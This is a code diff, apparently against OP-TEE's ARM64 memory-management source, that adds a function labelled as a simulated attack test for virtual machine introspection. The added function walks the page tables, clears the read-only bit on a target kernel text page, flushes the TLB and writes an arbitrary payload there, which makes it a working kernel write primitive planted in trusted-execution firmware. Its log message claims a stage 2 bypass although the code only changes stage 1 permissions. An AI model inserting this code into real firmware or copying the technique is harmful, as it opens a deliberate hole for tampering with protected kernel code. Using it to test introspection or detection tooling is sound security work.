@@ -1579,4 +1579,31 @@ enum core_mmu_fault core_mmu_get_fault_type(uint32_t fault_descr)
 		return CORE_MMU_FAULT_OTHER;
 	}
 }
+
+/* VMI ATTACK TEST - simulated kernel write primitive */
+void kernel_write_primitive(vaddr_t target_va, uint32_t payload)
+{
+    /* Step 1: Get page table base from ttbr0_el1 */
+    uint64_t ttbr0 = read_ttbr0_el1();
+    uint64_t *l1 = (uint64_t *)(ttbr0 & OUTPUT_ADDRESS_MASK);
+    /* Step 2: Walk L1 -> L2 -> L3 */
+    uint64_t l1_idx = (target_va >> 30) & 0x1FF;
+    uint64_t *l2 = (uint64_t *)(l1[l1_idx] & OUTPUT_ADDRESS_MASK);
+    uint64_t l2_idx = (target_va >> 21) & 0x1FF;
+    uint64_t *l3 = (uint64_t *)(l2[l2_idx] & OUTPUT_ADDRESS_MASK);
+    uint64_t l3_idx = (target_va >> 12) & 0x1FF;
+    /* Step 3: Clear AP_RO bit — make page writable in stage 1 */
+    dsb();
+    l3[l3_idx] &= ~LOWER_ATTRS(AP_RO);
+    dsb();
+    /* Step 4: Flush TLB */
+    tlbi_all();
+    isb();
+    /* Step 5: Write payload to text page */
+    *(volatile uint32_t *)target_va = payload;
+    DMSG("kernel_write_primitive: STAGE 2 PROTECTION BYPASSED - wrote 0x%x to 0x%" PRIxVA, payload, target_va);
+}
+/* VMI ATTACK TEST END */
+
+
 #endif /*ARM64*/
